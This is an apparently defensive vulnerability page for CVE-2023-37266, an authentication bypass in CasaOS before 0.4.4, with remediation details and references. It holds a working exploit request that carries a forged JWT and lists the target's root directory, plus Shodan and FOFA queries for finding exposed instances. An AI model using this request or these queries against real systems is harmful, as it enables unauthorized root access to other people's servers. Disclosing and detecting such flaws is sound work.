---
layout: post
cve_id: CVE-2023-37266
title: CasaOS  < 0.4.4 - Authentication Bypass via Random JWT Token
pcap: true
pcap_path: /pcaps/2023/CVE-2023-37266.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2023/CVE-2023-37266.yaml
snort2_rule: N/A
snort3_rule: N/A
author: iamnoooob,DhiyaneshDK,pdresearch
severity: critical
impact: 'Successful exploitation allows unauthorized access to the CasaOS system.

  '
remediation: The problem was addressed by improving the validation of JWTs in 705bf1f.
  This patch is part of CasaOS 0.4.4.
reference:
- https://github.com/IceWhaleTech/CasaOS/commit/705bf1facbffd2ca40b159b0303132b6fdf657ad
- https://github.com/IceWhaleTech/CasaOS/security/advisories/GHSA-m5q5-8mfw-p2hr
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
  cvss-score: 9.8
  cve-id: CVE-2023-37266
  cwe-id: CWE-287
  epss-score: 0.8916
  epss-percentile: 0.99511
  cpe: cpe:2.3:o:icewhale:casaos:*:*:*:*:*:*:*:*
metadata:
  verified: true
  max-request: 1
  vendor: icewhale
  product: casaos
  shodan-query:
  - http.html:"/CasaOS-UI/public/index.html"
  - http.html:"/casaos-ui/public/index.html"
  fofa-query:
  - body="/CasaOS-UI/public/index.html"
  - body="/casaos-ui/public/index.html"
tags:
- cve2023
- cve
- oss
- casaos
- jwt
- icewhale
- vuln
---

## ðŸ” Vulnerability Description
CasaOS is an open-source Personal Cloud system. Unauthenticated attackers can craft arbitrary JWTs and access features that usually require authentication and execute arbitrary commands as `root` on CasaOS instances. This problem was addressed by improving the validation of JWTs in commit `705bf1f`. This patch is part of CasaOS 0.4.4. Users should upgrade to CasaOS 0.4.4. If they can't, they should temporarily restrict access to CasaOS to untrusted users, for instance by not exposing it publicly.


## ðŸŒ HTTP Request
```nohighlight
GET /v1/folder?path=%2F HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)  Safari/537.36
Connection: close
Accept: */*
Accept-Language: en
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3OTAyMTAzMjIsImlhdCI6MTc5MDE5OTUyMiwiaXNzIjoiY2FzYW9zIiwibmJmIjoxNzkwMTk5NTIyfQ.kl56YlWfRzweeecJQDTFELQEB7xW512l8K5R8UGAZps
Accept-Encoding: gzip
```

